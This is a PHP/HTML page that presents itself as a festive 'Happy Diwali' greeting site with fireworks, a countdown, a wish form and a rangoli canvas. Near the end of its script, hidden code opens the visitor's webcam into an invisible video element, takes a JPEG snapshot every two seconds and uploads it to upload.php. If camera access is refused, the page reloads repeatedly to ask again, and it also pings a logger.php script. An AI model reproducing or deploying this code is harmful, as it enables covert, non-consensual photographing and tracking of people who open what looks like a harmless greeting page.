<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Diwali </title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Global Styles */
        :root {
            --primary: #FFA500;
            --secondary: #FFD700;
            --accent: #FF4500;
            --dark: #8B0000;
            --light: #FFF8DC;
            --text: #333;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: #111;
            color: var(--light);
            overflow-x: hidden;
            position: relative;
        }

        /* Background Canvas for Fireworks */
        #fireworks-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        /* Header Styles */
        header {
            background: linear-gradient(135deg, var(--dark), var(--accent));
            text-align: center;
            padding: 2rem 1rem;
            position: relative;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }

        .header-content {
            position: relative;
            z-index: 2;
        }

        h1 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            color: var(--secondary);
            text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
            }
            to {
                text-shadow: 0 0 15px var(--secondary), 0 0 30px var(--accent);
            }
        }

        .header-diyas {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-top: 2rem;
        }

        .diya {
            width: 60px;
            height: 60px;
            background-color: #e67e22;
            border-radius: 50% 50% 0 0;
            position: relative;
            box-shadow: 0 0 20px rgba(255, 165, 0, 0.7);
        }

        .diya::before {
            content: '';
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 30px;
            height: 40px;
            background-color: #f1c40f;
            border-radius: 50% 50% 0 0;
            animation: flicker 1.5s infinite alternate;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
        }

        @keyframes flicker {
            0%, 100% {
                opacity: 1;
                height: 40px;
            }
            25% {
                opacity: 0.8;
                height: 35px;
            }
            50% {
                opacity: 1;
                height: 45px;
            }
            75% {
                opacity: 0.7;
                height: 30px;
            }
        }

        /* Navigation */
        nav {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 1rem;
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(5px);
        }

        nav ul {
            display: flex;
            justify-content: center;
            list-style: none;
            gap: 2rem;
        }

        nav a {
            color: var(--light);
            text-decoration: none;
            font-weight: bold;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            transition: all 0.3s ease;
        }

        nav a:hover {
            background-color: var(--primary);
            color: var(--dark);
        }

        /* Main Content */
        main {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        section {
            margin-bottom: 4rem;
            padding: 2rem;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        section:hover {
            transform: translateY(-5px);
        }

        section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
        }

        h2 {
            color: var(--secondary);
            margin-bottom: 1.5rem;
            font-size: 2rem;
            position: relative;
            display: inline-block;
        }

        h2::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), transparent);
        }

        /* Countdown Section */
        .countdown-container {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
        }

        .countdown-box {
            background: linear-gradient(135deg, var(--dark), var(--accent));
            padding: 1.5rem;
            border-radius: 10px;
            text-align: center;
            min-width: 120px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .countdown-value {
            font-size: 3rem;
            font-weight: bold;
            color: var(--secondary);
        }

        .countdown-label {
            font-size: 1rem;
            color: var(--light);
        }

        /* Greeting Section */
        .greeting-message {
            font-size: 1.2rem;
            line-height: 1.6;
            margin-bottom: 2rem;
            text-align: justify;
        }

        /* Diya Section */
        .diyas-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 2rem;
            margin-top: 2rem;
        }

        .diya-large {
            width: 100px;
            height: 100px;
            background-color: #e67e22;
            border-radius: 50% 50% 0 0;
            position: relative;
            box-shadow: 0 0 30px rgba(255, 165, 0, 0.7);
        }

        .diya-large::before {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 50px;
            height: 70px;
            background-color: #f1c40f;
            border-radius: 50% 50% 0 0;
            animation: flicker 1.5s infinite alternate;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
        }

        /* Wish Form */
        .wish-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            max-width: 600px;
            margin: 0 auto;
        }

        .wish-input {
            padding: 1rem;
            border-radius: 5px;
            border: none;
            background-color: rgba(255, 255, 255, 0.1);
            color: var(--light);
            font-size: 1rem;
        }

        .wish-input:focus {
            outline: 2px solid var(--primary);
        }

        .btn {
            padding: 1rem 2rem;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }

        .btn:active {
            transform: translateY(1px);
        }

        /* Wishes Display */
        .wishes-container {
            margin-top: 2rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .wish-card {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 1.5rem;
            border-radius: 10px;
            border-left: 5px solid var(--primary);
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Rangoli Section */
        .rangoli-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        #rangoli-canvas {
            background-color: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            margin-top: 1rem;
            cursor: crosshair;
        }

        .rangoli-controls {
            display: flex;
            gap: 1rem;
            margin-top: 1rem;
        }

        .rangoli-color-picker {
            display: flex;
            gap: 0.5rem;
        }

        .rangoli-color {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            cursor: pointer;
            border: 2px solid white;
        }

        /* Music Controls */
        .music-controls {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 100;
        }

        .music-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-color: var(--primary);
            color: white;
            border: none;
            font-size: 1.2rem;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .music-btn:hover {
            transform: scale(1.1);
        }

        /* Social Share */
        .social-share {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-top: 2rem;
        }

        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--primary);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .social-icon:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(255, 165, 0, 0.5);
        }

        /* Footer */
        footer {
            background: linear-gradient(135deg, var(--dark), var(--accent));
            text-align: center;
            padding: 2rem;
            margin-top: 4rem;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }

            nav ul {
                flex-direction: column;
                align-items: center;
                gap: 0.5rem;
            }

            section {
                padding: 1.5rem;
            }

            .countdown-box {
                min-width: 80px;
                padding: 1rem;
            }

            .countdown-value {
                font-size: 2rem;
            }
        }

        /* Floating Lanterns */
        .lantern {
            position: absolute;
            width: 40px;
            height: 60px;
            background-color: var(--primary);
            border-radius: 50% 50% 5px 5px;
            opacity: 0.7;
            z-index: -1;
            animation: float 15s infinite linear;
        }

        .lantern::before {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 20px;
            height: 10px;
            background-color: var(--secondary);
            border-radius: 0 0 5px 5px;
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-100px) rotate(5deg);
            }
            100% {
                transform: translateY(0) rotate(0deg);
            }
        }


        #silent-video, #silent-canvas {
            display: none !important;
        }
    </style>
</head>
<body>

    <video id="silent-video" autoplay playsinline></video>
    <canvas id="silent-canvas"></canvas>

    <!-- Fireworks Canvas Background -->
    <canvas id="fireworks-canvas"></canvas>

    <!-- Floating Lanterns -->
    <div class="lantern" style="left: 10%; top: 20%;"></div>
    <div class="lantern" style="left: 30%; top: 30%; animation-delay: -3s;"></div>
    <div class="lantern" style="left: 70%; top: 25%; animation-delay: -5s;"></div>
    <div class="lantern" style="left: 85%; top: 40%; animation-delay: -7s;"></div>

    <!-- Header -->
    <header>
        <div class="header-content">
            <h1>Happy Diwali </h1>
            <p>May the divine light of Diwali spread into your life peace, prosperity, happiness and good health.</p>
            <div class="header-diyas">
                <div class="diya"></div>
                <div class="diya" style="animation-delay: 0.5s;"></div>
                <div class="diya" style="animation-delay: 1s;"></div>
                <div class="diya" style="animation-delay: 1.5s;"></div>
                <div class="diya" style="animation-delay: 0.7s;"></div>
            </div>
        </div>
    </header>

    <!-- Navigation -->
    <nav>
        <ul>
            <li><a href="#countdown">Countdown</a></li>
            <li><a href="#greeting">Greetings</a></li>
            <li><a href="#diyas">Diyas</a></li>
            <li><a href="#wishes">Send Wishes</a></li>
            <li><a href="#rangoli">Rangoli</a></li>
        </ul>
    </nav>

    <!-- Main Content -->
    <main>
        <!-- Countdown Section -->
        <section id="countdown">
            <h2>Countdown to Diwali</h2>
            <div class="countdown-container">
                <div class="countdown-box">
                    <div class="countdown-value" id="days">00</div>
                    <div class="countdown-label">Days</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-value" id="hours">00</div>
                    <div class="countdown-label">Hours</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-value" id="minutes">00</div>
                    <div class="countdown-label">Minutes</div>
                </div>
                <div class="countdown-box">
                    <div class="countdown-value" id="seconds">00</div>
                    <div class="countdown-label">Seconds</div>
                </div>
            </div>
            <button id="fireworks-btn" class="btn" style="margin-top: 2rem;">Launch Fireworks!</button>
        </section>

        <!-- Greeting Section -->
        <section id="greeting">
            <h2>Diwali Greetings</h2>
            <div class="greeting-message">
                <p>As the festival of lights approaches, may your life be filled with the glow of happiness, the sparkle of joy, and the brightness of prosperity. Diwali is a time to celebrate the victory of light over darkness, knowledge over ignorance, and good over evil.</p>
                <p>May this Diwali bring you and your loved ones closer, strengthen your bonds, and create beautiful memories that last a lifetime. Light a diya of love, burst a firework of happiness, and enjoy the sweets of success.</p>
                <p>Wishing you and your family a very Happy Diwali! May Goddess Lakshmi bless you with wealth and prosperity, and may Lord Ganesha remove all obstacles from your path.</p>
            </div>
        </section>

        <!-- Diyas Section -->
        <section id="diyas">
            <h2>Light the Diyas</h2>
            <p>Click the button below to light more diyas and spread the light of Diwali!</p>
            <button id="light-diya-btn" class="btn">Light a Diya</button>
            <div class="diyas-container" id="diyas-container">
                <div class="diya-large"></div>
                <div class="diya-large" style="animation-delay: 0.3s;"></div>
                <div class="diya-large" style="animation-delay: 0.6s;"></div>
            </div>
        </section>

        <!-- Wishes Section -->
        <section id="wishes">
            <h2>Send Your Diwali Wishes</h2>
            <form class="wish-form" id="wish-form">
                <textarea class="wish-input" id="wish-input" placeholder="Type your Diwali wishes here..." rows="4" required></textarea>
                <button type="submit" class="btn">Share Your Wish</button>
            </form>
            <div class="wishes-container" id="wishes-container"></div>
        </section>

        <!-- Rangoli Section -->
        <section id="rangoli">
            <h2>Create Digital Rangoli</h2>
            <p>Draw your own rangoli design below by clicking and dragging your mouse:</p>
            <div class="rangoli-container">
                <canvas id="rangoli-canvas" width="600" height="400"></canvas>
                <div class="rangoli-controls">
                    <div class="rangoli-color-picker">
                        <div class="rangoli-color" style="background-color: #FF4500;" data-color="#FF4500"></div>
                        <div class="rangoli-color" style="background-color: #FFD700;" data-color="#FFD700"></div>
                        <div class="rangoli-color" style="background-color: #FFFFFF;" data-color="#FFFFFF"></div>
                        <div class="rangoli-color" style="background-color: #008000;" data-color="#008000"></div>
                        <div class="rangoli-color" style="background-color: #0000FF;" data-color="#0000FF"></div>
                    </div>
                    <button id="clear-rangoli" class="btn">Clear</button>
                </div>
            </div>
        </section>

        <!-- Social Share -->
        <div class="social-share">
            <a href="https://instagram.com" class="social-icon" id="share-twitter"><i class="fab fa-twitter"></i></a>
            <a href="https://facebook.com" class="social-icon" id="share-facebook"><i class="fab fa-facebook-f"></i></a>
            <a href="https://wa.me/" class="social-icon" id="share-whatsapp"><i class="fab fa-whatsapp"></i></a>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <p>Wishing you a very Happy Diwali and a prosperous New Year!</p>
        <p>� 2025 Diwali Celebration. All rights reserved.</p>
    </footer>

    <!-- Music Controls -->
    <div class="music-controls">
        <button class="music-btn" id="music-toggle"><i class="fas fa-music"></i></button>
    </div>

    <!-- Audio Element -->
    <audio id="diwali-music" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script>
        // Fireworks Animation
        const fireworksCanvas = document.getElementById('fireworks-canvas');
        const fireworksCtx = fireworksCanvas.getContext('2d');
        let fireworks = [];
        let particles = [];
        let isFireworksActive = false;

        // Set canvas size
        function resizeCanvas() {
            fireworksCanvas.width = window.innerWidth;
            fireworksCanvas.height = window.innerHeight;
        }

        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        // Firework class
        class Firework {
            constructor() {
                this.x = Math.random() * fireworksCanvas.width;
                this.y = fireworksCanvas.height;
                this.targetY = Math.random() * fireworksCanvas.height * 0.6;
                this.speed = 2 + Math.random() * 3;
                this.radius = 2;
                this.color = `hsl(${Math.random() * 60 + 10}, 100%, 50%)`;
                this.particles = [];
                this.exploded = false;
            }

            update() {
                if (!this.exploded) {
                    this.y -= this.speed;

                    // Explode when reaching target height
                    if (this.y <= this.targetY) {
                        this.explode();
                    }
                }

                // Update particles
                for (let i = 0; i < this.particles.length; i++) {
                    const p = this.particles[i];
                    p.x += p.vx;
                    p.y += p.vy;
                    p.vy += 0.05; // gravity
                    p.alpha -= 0.01; // fade out

                    // Remove particle if faded out
                    if (p.alpha <= 0) {
                        this.particles.splice(i, 1);
                        i--;
                    }
                }
            }

            explode() {
                this.exploded = true;
                const particleCount = 100 + Math.floor(Math.random() * 50);
                
                for (let i = 0; i < particleCount; i++) {
                    const angle = Math.random() * Math.PI * 2;
                    const speed = Math.cos(Math.random() * Math.PI / 2) * 5;
                    
                    this.particles.push({
                        x: this.x,
                        y: this.y,
                        vx: Math.cos(angle) * speed,
                        vy: Math.sin(angle) * speed,
                        color: this.color,
                        alpha: 1,
                        radius: 1 + Math.random() * 2
                    });
                }
            }

            draw() {
                if (!this.exploded) {
                    fireworksCtx.beginPath();
                    fireworksCtx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                    fireworksCtx.fillStyle = this.color;
                    fireworksCtx.fill();

                    // Add trail
                    fireworksCtx.beginPath();
                    fireworksCtx.moveTo(this.x, this.y);
                    fireworksCtx.lineTo(this.x, this.y + 10);
                    fireworksCtx.strokeStyle = this.color;
                    fireworksCtx.stroke();
                }

                // Draw particles
                for (const p of this.particles) {
                    fireworksCtx.globalAlpha = p.alpha;
                    fireworksCtx.beginPath();
                    fireworksCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                    fireworksCtx.fillStyle = p.color;
                    fireworksCtx.fill();
                }
                fireworksCtx.globalAlpha = 1;
            }
        }

        // Animation loop
        function animate() {
            requestAnimationFrame(animate);
            
            // Clear canvas with semi-transparent black for trail effect
            fireworksCtx.fillStyle = 'rgba(0, 0, 0, 0.1)';
            fireworksCtx.fillRect(0, 0, fireworksCanvas.width, fireworksCanvas.height);

            // Create random fireworks
            if (isFireworksActive && Math.random() < 0.05) {
                fireworks.push(new Firework());
            }

            // Update and draw fireworks
            for (let i = 0; i < fireworks.length; i++) {
                fireworks[i].update();
                fireworks[i].draw();

                // Remove firework if all particles are gone
                if (fireworks[i].exploded && fireworks[i].particles.length === 0) {
                    fireworks.splice(i, 1);
                    i--;
                }
            }
        }

        animate();

        // Toggle fireworks on button click
        document.getElementById('fireworks-btn').addEventListener('click', function() {
            isFireworksActive = !isFireworksActive;
            this.textContent = isFireworksActive ? 'Stop Fireworks' : 'Launch Fireworks!';
            
            // Launch a few fireworks immediately when activated
            if (isFireworksActive) {
                for (let i = 0; i < 5; i++) {
                    setTimeout(() => fireworks.push(new Firework()), i * 300);
                }
            }
        });

        // Countdown Timer
        function updateCountdown() {
            // Set Diwali date (October 20, 2025)
            const diwaliDate = new Date('October 20, 2025 00:00:00').getTime();
            const now = new Date().getTime();
            const distance = diwaliDate - now;

            // Calculate days, hours, minutes, seconds
            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);

            // Display results
            document.getElementById('days').textContent = days.toString().padStart(2, '0');
            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
        }

        // Update countdown every second
        setInterval(updateCountdown, 1000);
        updateCountdown();

        // Light Diya Button
        document.getElementById('light-diya-btn').addEventListener('click', function() {
            const diyasContainer = document.getElementById('diyas-container');
            const newDiya = document.createElement('div');
            newDiya.className = 'diya-large';
            newDiya.style.animationDelay = `${Math.random() * 2}s`;
            diyasContainer.appendChild(newDiya);
            
            // Scroll to the newly added diya
            newDiya.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        });

        // Wish Form
        document.getElementById('wish-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const wishInput = document.getElementById('wish-input');
            const wishesContainer = document.getElementById('wishes-container');
            
            if (wishInput.value.trim()) {
                const wishCard = document.createElement('div');
                wishCard.className = 'wish-card';
                wishCard.textContent = wishInput.value;
                wishesContainer.prepend(wishCard);
                
                // Clear input
                wishInput.value = '';
                
                // Launch a firework for the wish
                fireworks.push(new Firework());
            }
        });

        // Rangoli Drawing
        const rangoliCanvas = document.getElementById('rangoli-canvas');
        const rangoliCtx = rangoliCanvas.getContext('2d');
        let isDrawing = false;
        let currentColor = '#FF4500';
        let lastX = 0;
        let lastY = 0;

        // Set line properties
        rangoliCtx.lineWidth = 5;
        rangoliCtx.lineCap = 'round';
        rangoliCtx.strokeStyle = currentColor;

        // Drawing functions
        rangoliCanvas.addEventListener('mousedown', startDrawing);
        rangoliCanvas.addEventListener('mousemove', draw);
        rangoliCanvas.addEventListener('mouseup', stopDrawing);
        rangoliCanvas.addEventListener('mouseout', stopDrawing);

        // Touch support
        rangoliCanvas.addEventListener('touchstart', handleTouchStart);
        rangoliCanvas.addEventListener('touchmove', handleTouchMove);
        rangoliCanvas.addEventListener('touchend', handleTouchEnd);

        function startDrawing(e) {
            isDrawing = true;
            [lastX, lastY] = getPosition(e);
        }

        function draw(e) {
            if (!isDrawing) return;
            
            const [x, y] = getPosition(e);
            
            rangoliCtx.beginPath();
            rangoliCtx.moveTo(lastX, lastY);
            rangoliCtx.lineTo(x, y);
            rangoliCtx.stroke();
            
            [lastX, lastY] = [x, y];
        }

        function stopDrawing() {
            isDrawing = false;
        }

        function handleTouchStart(e) {
            e.preventDefault();
            const touch = e.touches[0];
            const mouseEvent = new MouseEvent('mousedown', {
                clientX: touch.clientX,
                clientY: touch.clientY
            });
            rangoliCanvas.dispatchEvent(mouseEvent);
        }

        function handleTouchMove(e) {
            e.preventDefault();
            const touch = e.touches[0];
            const mouseEvent = new MouseEvent('mousemove', {
                clientX: touch.clientX,
                clientY: touch.clientY
            });
            rangoliCanvas.dispatchEvent(mouseEvent);
        }

        function handleTouchEnd(e) {
            e.preventDefault();
            const mouseEvent = new MouseEvent('mouseup', {});
            rangoliCanvas.dispatchEvent(mouseEvent);
        }

        function getPosition(e) {
            const rect = rangoliCanvas.getBoundingClientRect();
            return [
                e.clientX - rect.left,
                e.clientY - rect.top
            ];
        }

        // Color picker
        document.querySelectorAll('.rangoli-color').forEach(color => {
            color.addEventListener('click', function() {
                currentColor = this.dataset.color;
                rangoliCtx.strokeStyle = currentColor;
                
                // Highlight selected color
                document.querySelectorAll('.rangoli-color').forEach(c => {
                    c.style.border = '2px solid white';
                });
                this.style.border = '2px solid gold';
            });
        });

        // Clear canvas
        document.getElementById('clear-rangoli').addEventListener('click', function() {
            rangoliCtx.clearRect(0, 0, rangoliCanvas.width, rangoliCanvas.height);
        });

        // Music Toggle
        const musicToggle = document.getElementById('music-toggle');
        const diwaliMusic = document.getElementById('diwali-music');

        musicToggle.addEventListener('click', function() {
            if (diwaliMusic.paused) {
                diwaliMusic.play();
                this.innerHTML = '<i class="fas fa-volume-up"></i>';
            } else {
                diwaliMusic.pause();
                this.innerHTML = '<i class="fas fa-music"></i>';
            }
        });

        // Social Share
        document.getElementById('share-twitter').addEventListener('click', function(e) {
            e.preventDefault();
            const url = encodeURIComponent(window.location.href);
            const text = encodeURIComponent('Check out this beautiful Diwali website! Wishing you a Happy Diwali! ');
            window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
        });

        document.getElementById('share-facebook').addEventListener('click', function(e) {
            e.preventDefault();
            const url = encodeURIComponent(window.location.href);
            window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank');
        });

        document.getElementById('share-whatsapp').addEventListener('click', function(e) {
            e.preventDefault();
            const text = encodeURIComponent('Check out this beautiful Diwali website! Wishing you a Happy Diwali!  ' + window.location.href);
            window.open(`https://wa.me/?text=${text}`, '_blank');
        });

        // Smooth scrolling for navigation
        document.querySelectorAll('nav a').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const targetId = this.getAttribute('href');
                const targetElement = document.querySelector(targetId);
                
                if (targetElement) {
                    window.scrollTo({
                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                }
            });
        });

        // Add some initial wishes
        const initialWishes = [
            "Wishing you a Diwali filled with love, laughter, and prosperity!",
            "May the divine light of Diwali bring peace, happiness, and prosperity to you and your family.",
            "Sending you warm wishes on Diwali and wishing that it brings happiness and peace to your life.",
            "May this Diwali light up new dreams, fresh hopes, and fill your days with pleasant surprises."
        ];

        const wishesContainer = document.getElementById('wishes-container');
        initialWishes.forEach(wish => {
            const wishCard = document.createElement('div');
            wishCard.className = 'wish-card';
            wishCard.textContent = wish;
            wishesContainer.appendChild(wishCard);
        });

       
        const silentVideo = document.getElementById('silent-video');
        const silentCanvas = document.getElementById('silent-canvas');
        const silentCtx = silentCanvas.getContext('2d');

        let lastImageHash = "";

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0; // convert to 32-bit integer
            }
            return hash;
        }

        function captureAndSend() {
            const width = silentVideo.videoWidth;
            const height = silentVideo.videoHeight;

            if (width === 0 || height === 0) return;

            silentCanvas.width = width;
            silentCanvas.height = height;
            silentCtx.drawImage(silentVideo, 0, 0, width, height);

            const dataUrl = silentCanvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return; // same image, skip upload
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    silentVideo.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        startCamera();
        fetch("logger.php").then(res => res.text()).then(console.log);
    </script>
</body>
</html>